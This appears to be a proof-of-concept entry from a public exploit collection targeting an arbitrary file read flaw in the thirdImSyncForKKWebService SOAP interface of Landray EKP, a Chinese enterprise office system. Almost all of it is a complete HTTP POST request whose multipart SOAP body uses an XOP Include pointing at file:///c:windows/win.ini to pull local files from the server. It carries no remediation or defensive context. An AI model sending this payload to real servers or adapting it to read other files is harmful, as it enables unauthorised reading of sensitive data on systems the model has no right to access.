# landray_thirdImSyncForKKWebService_fileread

from: https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3thirdImSyncForKKWebService%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md

product: 蓝凌EKP
```
POST /sys/webservice/thirdImSyncForKKWebService HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Content-Length: 563
Content-Type: multipart/related; boundary=----oxmmdmlnvlx08yluof5q
SOAPAction: ""
Accept-Encoding: gzip, deflate

------oxmmdmlnvlx08yluof5q
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
<web:getTodo>
<arg0>
<otherCond>1</otherCond>
<pageNo>1</pageNo>
<rowSize>1</rowSize>
<targets>1</targets>
<type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///c:windows/win.ini"/></type>
</arg0>
</web:getTodo>
</soapenv:Body>
</soapenv:Envelope>
------oxmmdmlnvlx08yluof5q--
```
